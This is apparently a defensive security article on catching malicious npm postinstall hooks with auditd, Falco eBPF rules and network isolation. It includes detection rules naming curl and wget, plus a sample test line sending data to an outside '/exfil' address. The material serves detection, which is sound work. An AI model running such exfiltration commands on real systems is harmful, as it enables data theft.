---
title: "Detecting Malicious npm postinstall Scripts at the Kernel Level"
description: "The Axios supply chain compromise delivered a cross-platform RAT via a postinstall hook. Learn how auditd rules and eBPF-based runtime monitoring catch the process spawning and C2 connections that betray malicious npm install scripts on Linux."
slug: npm-postinstall-kernel-detection
date: 2026-05-03
lastmod: 2026-05-03
category: linux
tags:
  - supply-chain
  - npm
  - auditd
  - ebpf
  - runtime-detection
personas:
  - security-engineer
  - platform-engineer
article_number: 415
difficulty: Advanced
estimated_reading_time: 12
published: true
layout: article.njk
permalink: /articles/linux/npm-postinstall-kernel-detection/
---

# Detecting Malicious npm postinstall Scripts at the Kernel Level

## The Problem

On March 31 2026, Axios — the JavaScript HTTP client with 100 million weekly npm downloads — was compromised by a North Korean threat actor who used a stolen maintainer token to publish versions 1.14.1 and 0.30.0 containing a malicious `postinstall` hook. The hook installed a phantom dependency (`plain-crypto-js@4.2.1`) that deployed a cross-platform RAT, establishing C2 connections and erasing its own files. Every developer or CI system that ran `npm install axios` during the ~3-hour window installed the RAT with no warning.

The `postinstall` script is a standard npm lifecycle hook — legitimate packages use it for native module compilation — which makes it impossible to block entirely without breaking real packages. npm does not sandbox lifecycle scripts: they execute with the same privileges as the `npm install` process, with full network access and filesystem write permissions. The registry cannot be relied upon to prevent this; Axios itself was published by a legitimate account, and the malicious versions were indistinguishable from real releases until analysis began.

The defence layer is the Linux kernel: auditd and eBPF-based tools can observe the exact system calls that a malicious `postinstall` makes — unexpected `execve` of network tools, outbound `connect` calls to non-RFC1918 addresses, `unlink` of newly-written files — and alert or terminate the process before the RAT establishes persistence. These detections operate beneath the JavaScript runtime, beneath npm's own code, and beneath any userspace tooling the attacker might control.

**Target systems:** Linux kernel 5.8+ for eBPF; auditd on Ubuntu 24.04 / RHEL 9; Falco 0.37+ with the modern eBPF probe.

## Threat Model

- **Compromised npm package executing malicious code during `npm install`** on a developer workstation or CI runner. The attacker has no prior access to the machine; the malicious code runs because the developer typed an ordinary `npm install` command.
- **RAT deployed via `postinstall` establishing outbound C2 connection** from within the `npm` process tree. The malicious `postinstall` in the Axios compromise contacted a remote server to deliver a second-stage payload, passing host metadata as query parameters.
- **Network tools spawned as children of `node`**: `curl`, `wget`, `python3`, or Node.js's built-in `https` module, all triggered as child processes of `npm`. Legitimate `postinstall` scripts do not typically spawn external network binaries — they call into `node-gyp`, a compiler toolchain, or a bundled binary.
- **Evidence erasure**: the Axios RAT replaced its own source files with clean decoys after execution, calling `unlink` on the malicious scripts and writing innocuous content in their place. Post-mortem analysis on compromised machines found a clean-looking `plain-crypto-js` package with no visible payload.
- **CI runners that run `npm install` as root** or without process isolation amplify the blast radius: a RAT executing as root has unrestricted filesystem and network access and can install systemd units, modify `/etc/cron.d`, or exfiltrate credentials from environment variables.
- **Access level**: the adversary achieves code execution on any machine that installs the malicious package during the exposure window. No vulnerability is required; `postinstall` is a designed feature of the npm lifecycle.

## Hardening Configuration

### Control 1: `--ignore-scripts` as the Primary Control

The highest-leverage control is preventing lifecycle scripts from executing at all. Setting `ignore-scripts=true` in `.npmrc` makes `npm install` skip all `preinstall`, `install`, and `postinstall` hooks for every package in the dependency tree.

```bash
npm config set ignore-scripts true
```

```ini
# .npmrc (project-level, committed to the repository)
ignore-scripts=true
```

With this set, installing `axios@1.14.1` downloads the package but never executes the malicious `postinstall` hook. The RAT is never deployed.

The caveat: roughly 8% of packages in a typical enterprise `node_modules` tree use `postinstall` for native compilation via `node-gyp` (e.g., `bcrypt`, `canvas`, `sqlite3`). Auditing which packages in your tree actually require a `postinstall` before disabling scripts prevents surprises:

```bash
npm ls --parseable \
  | xargs -I{} sh -c 'cat {}/package.json 2>/dev/null' \
  | jq -r 'select(.scripts.postinstall) | .name'
```

This lists every package name that declares a `postinstall` script. Cross-reference against your lockfile; the result is your allowlist for selective script execution. For packages that legitimately need `postinstall`, run a second targeted pass:

```bash
npm install --ignore-scripts
npm rebuild bcrypt canvas sqlite3
```

`npm rebuild` runs only the `install` script (native compilation) for the named packages, with no `postinstall` from untrusted dependencies.

### Control 2: auditd Rules for npm Install Anomalies

auditd rules watch the kernel's `execve` and `connect` syscall paths, regardless of what happens at the userspace level. The following ruleset targets the specific behaviours the Axios RAT exhibited: spawning network tools from a `node` process, making outbound connections from `node` during install, and unlinking files immediately after writing them.

```conf
# /etc/audit/rules.d/npm-postinstall.rules
# Detect anomalous behaviour from npm postinstall scripts.
# Apply with: sudo augenrules --load

# execve of network tools spawned as children of node/npm processes.
# Legitimate postinstall scripts (node-gyp) do not call curl/wget/python3.
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/curl -k npm_postinstall_network
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/wget -k npm_postinstall_network
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/python3 -k npm_postinstall_network
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/python -k npm_postinstall_network
-a always,exit -F arch=b64 -S execve -F exe=/bin/sh -F ppid!=1 -k npm_shell_spawn

# Outbound connect syscalls from node processes.
# a2=2 is AF_INET; a2=10 is AF_INET6. Filters exclude loopback connections.
-a always,exit -F arch=b64 -S connect -F exe=/usr/bin/node -k npm_node_connect
-a always,exit -F arch=b64 -S connect -F exe=/usr/local/bin/node -k npm_node_connect

# Evidence erasure: unlink of files in node_modules shortly after creation.
-a always,exit -F arch=b64 -S unlink -S unlinkat -F dir=/home -k npm_postinstall_unlink
-a always,exit -F arch=b64 -S unlink -S unlinkat -F dir=/root -k npm_postinstall_unlink
-a always,exit -F arch=b64 -S unlink -S unlinkat -F dir=/tmp -k npm_postinstall_unlink

# IOC: write to the specific phantom dependency directory from the Axios attack.
-w /home -p w -k npm_phantom_dep_write
-a always,exit -F arch=b64 -S mkdir -F dir=/home -k npm_dir_create
```

Query for alerts after a suspicious install:

```bash
sudo ausearch -k npm_postinstall_network --format text -ts today
sudo ausearch -k npm_node_connect --format text -ts today
sudo ausearch -k npm_postinstall_unlink --format text -ts today
```

The `-k` key provides fast lookups without scanning the full audit log. Pipe through `aureport` for a summary:

```bash
sudo aureport --key --summary | grep npm
```

### Control 3: Falco eBPF Rule for postinstall C2

Falco attaches eBPF probes to kernel tracepoints and evaluates rules against a stream of system events. The following rule fires when any process whose ancestor chain includes `npm` or `node` opens a TCP connection to a non-RFC1918 address — the exact pattern the Axios RAT used to contact its C2 server.

```yaml
# /etc/falco/rules.d/npm-postinstall.yaml
- rule: npm postinstall outbound C2 connection
  desc: >
    A process descended from npm or node established an outbound TCP
    connection to a public IP address during or after package installation.
    Legitimate postinstall scripts connect only to localhost or package
    registries; connections to arbitrary public IPs indicate a RAT or
    data exfiltration attempt.
  condition: >
    evt.type = connect
    and evt.dir = <
    and fd.typechar = 4
    and not fd.sip in (rfc_1918_cidrs)
    and not fd.sport in (allowed_npm_ports)
    and (
      proc.name in (node, npm, sh, bash)
      or proc.pname in (node, npm, sh, bash)
      or proc.aname[2] in (node, npm)
      or proc.aname[3] in (node, npm)
    )
  output: >
    Outbound connection from npm/node process tree to public IP
    (proc=%proc.name pid=%proc.pid ppid=%proc.ppid pname=%proc.pname
     ip=%fd.sip port=%fd.sport cwd=%proc.cwd cmdline=%proc.cmdline)
  priority: CRITICAL
  tags: [supply-chain, npm, network, c2]

- list: rfc_1918_cidrs
  items:
    - "10.0.0.0/8"
    - "172.16.0.0/12"
    - "192.168.0.0/16"
    - "127.0.0.1/8"
    - "::1/128"

- list: allowed_npm_ports
  items: [4873]
```

The `proc.aname[2]` and `proc.aname[3]` fields walk the ancestor chain. This catches the pattern where a `postinstall` script spawns `sh -c curl ...` — the direct parent of `curl` is `sh`, not `node`, but `node` appears two levels up. A rule matching only `proc.pname = node` would miss this; the ancestor chain rule does not.

Load and verify the rule:

```bash
sudo falco --validate /etc/falco/rules.d/npm-postinstall.yaml
sudo systemctl reload falco
sudo falco-driver-loader
```

Falco events route to `/var/log/falco/falco.log` by default and can be forwarded to any SIEM via the JSON output plugin or the gRPC output API.

### Control 4: Process Namespace Isolation for CI Builds

For CI runners where `npm install` should never require external network access (all dependencies are resolved from a lockfile and a local registry), run the install inside a network namespace with no external routing:

```bash
unshare --net --map-root-user npm install
```

`unshare --net` creates a new network namespace containing only a loopback interface. The `npm install` process and all its children — including any `postinstall` scripts — cannot open TCP connections to the internet. Attempts to `connect()` to a non-loopback address return `ENETUNREACH`. The Axios RAT would have spawned, attempted to contact its C2, received an immediate network error, and terminated without deploying its payload.

For CI pipelines using a local npm registry (Verdaccio, Artifactory, Nexus), the registry address is RFC1918 or loopback and remains reachable inside the namespace. The network restriction is additive: the install succeeds, and malicious callbacks silently fail.

```bash
unshare --net --map-root-user sh -c '
  ip link set lo up
  npm install --prefer-offline --no-audit
'
```

The `ip link set lo up` line activates loopback inside the new namespace, which is required for any localhost communication the toolchain might need.

### Control 5: auditd IOC Watch for the Phantom Dependency

The Axios attack used a specific phantom dependency name: `plain-crypto-js@4.2.1`. A file-watch rule on the `node_modules` path acts as an IOC indicator for this specific attack and as a general pattern for detecting unexpected dependency materialisation:

```conf
# /etc/audit/rules.d/npm-ioc.rules
# Alert on writes to the known-malicious phantom dependency directory.
-w /home/user/project/node_modules/plain-crypto-js -p rwxa -k ioc_plain_crypto_js
-w /root/project/node_modules/plain-crypto-js -p rwxa -k ioc_plain_crypto_js

# General pattern: alert when a new directory is created inside node_modules
# that was not present before install. Combine with lockfile diff in CI.
-a always,exit -F arch=b64 -S mkdir -F path=/node_modules -k npm_unexpected_dir
```

In CI, pair the `mkdir` alert with a lockfile integrity check: compare `package-lock.json` before and after install. Any new directory in `node_modules` that does not correspond to a lockfile entry is a signal of dependency confusion or a phantom dependency injection:

```bash
git diff --name-only HEAD -- package-lock.json
node -e "
  const lock = require('./package-lock.json');
  const pkgs = Object.keys(lock.packages || {});
  const dirs = require('fs').readdirSync('./node_modules');
  const unexpected = dirs.filter(d => !pkgs.some(p => p.endsWith('/' + d)));
  if (unexpected.length) { console.error('Unexpected node_modules dirs:', unexpected); process.exit(1); }
"
```

## Expected Behaviour After Hardening

With `--ignore-scripts` set in `.npmrc`, running `npm install axios@1.14.1` downloads and unpacks the malicious version but does not execute its `postinstall` hook. The `plain-crypto-js` dependency is never fetched. The RAT is never deployed. The install completes with exit code 0 and no network activity.

With the Falco rule active, a test `postinstall` script containing `curl https://93.184.216.34/exfil` triggers a `CRITICAL` alert in Falco's output within milliseconds of the `connect` syscall, with the full process name, PID, parent, working directory, and command line. The event is visible in `/var/log/falco/falco.log` and forwarded to the SIEM before the curl process completes its TCP handshake.

With the network namespace in place, running `npm install` in the isolated environment allows the install to complete while silently blocking any `postinstall` network callbacks. The `ENETUNREACH` error is visible in strace output but not reported to the operator — the failure is contained.

With the auditd IOC watch active, any write to a `node_modules/plain-crypto-js` directory generates an audit record tagged `ioc_plain_crypto_js`, queryable with `ausearch -k ioc_plain_crypto_js` and alertable via any auditd-to-SIEM pipeline.

## Trade-offs and Operational Considerations

`--ignore-scripts` is the highest-value control with the narrowest compatibility surface. The 8% figure for packages requiring `postinstall` is an average across large enterprise monorepos; repositories that depend on native addons (`bcrypt`, `canvas`, `sharp`, `sqlite3`) will see breakage immediately. Audit before enforcing with the `jq` command in Control 1. Use `npm rebuild` for the allowlisted set rather than re-enabling `--scripts` globally.

Falco with the eBPF probe requires a supported kernel (5.8+) and the `falco-driver-loader` to have run successfully at boot. Validate on your specific CI runner kernel version with `uname -r` and check the [Falco driver compatibility matrix](https://falco.org/docs/install-operate/supported-kernels/) before deploying. Kernel upgrades on CI hosts require re-running `falco-driver-loader` to rebuild the probe against the new kernel headers.

Network namespace isolation prevents `postinstall` scripts that legitimately download binary assets at install time — Playwright downloads browser binaries, Puppeteer downloads a Chromium build, esbuild and SWC download platform-specific native binaries. For these packages, use a two-phase install: `--ignore-scripts` first to install all JavaScript, then a targeted `npm rebuild` or `node node_modules/.bin/playwright install` in a non-isolated environment after the lockfile has been verified. This pattern retains detection coverage for the install phase while allowing intentional binary downloads in a controlled second step.

auditd rules for `execve` and `connect` generate high volume during large `npm install` runs on monorepos. Tune with `-F ppid!=1` to exclude direct children of PID 1 (init system), and add `-F auid!=4294967295` to exclude kernel threads. On busy CI hosts running parallel installs, set `backlog_limit = 65536` in `auditd.conf` to prevent event loss during install spikes.

The Falco `proc.aname` field depth (checking `aname[2]` and `aname[3]`) covers two and three levels of nesting above the connecting process. Deeply-nested shell invocations (`node` → `sh` → `bash` → `curl`) require extending the ancestor depth. In practice, the Axios RAT used a two-level chain (`node` → `sh` → `curl`); three levels of ancestor checking covers the observed attack pattern with one level of margin.

## Failure Modes

`--ignore-scripts` set in `.npmrc` but the CI pipeline overrides it explicitly with `npm install --scripts` or `npm install --foreground-scripts`. Both flags override the `.npmrc` setting without warning. Audit your CI configuration files for any `npm install` invocations that pass script-enabling flags; the `.npmrc` setting provides no protection when the flag is present on the command line.

The Falco rule matches on `proc.name in (node, npm, sh, bash)` but the RAT spawns a process with a renamed binary — a copy of `curl` renamed to a plausible system name like `kworker-helper` or dropped into `/tmp` with a random name. The rule misses the renamed binary because `proc.name` is the executable filename, not the binary hash. Supplement with a rule matching on `fd.sip` (destination IP) for all processes in the `node` ancestor chain, regardless of `proc.name`. Falco's `proc.exepath` can be combined with a hash check via the `falco-sandbox` enrichment plugin for binaries dropped to `/tmp`.

Network namespace isolation applied to `npm install` but not to `npm run build`. Many build scripts (`webpack`, `vite`, `esbuild`) are invoked via `npm run build` after install and can execute arbitrary `postinstall`-equivalent logic registered as `prepare` or `build` hooks. The network isolation must wrap both the install and the build step, or the build step must be audited separately.

The IOC file-watch rule for `plain-crypto-js` fires and generates an audit record, but the alert is routed to a low-priority queue in the SIEM — treated as an informational event rather than a critical alert requiring immediate response. Detection without response is not a control; the auditd key must be mapped to a high-severity alert rule in the SIEM with an automated remediation action (kill the process, quarantine the host) or the detection provides no reduction in attacker dwell time.

## Related Articles

- [Auditd Deep Dive](/articles/linux/auditd-deep-dive/)
- [eBPF LSM](/articles/linux/ebpf-lsm/)
- [Linux Capability Hardening](/articles/linux/linux-capability-hardening/)
- [npm Publish Account Hardening](/articles/cicd/npm-publish-account-hardening/)
- [npm Supply Chain Runtime Detection](/articles/observability/npm-supply-chain-runtime-detection/)
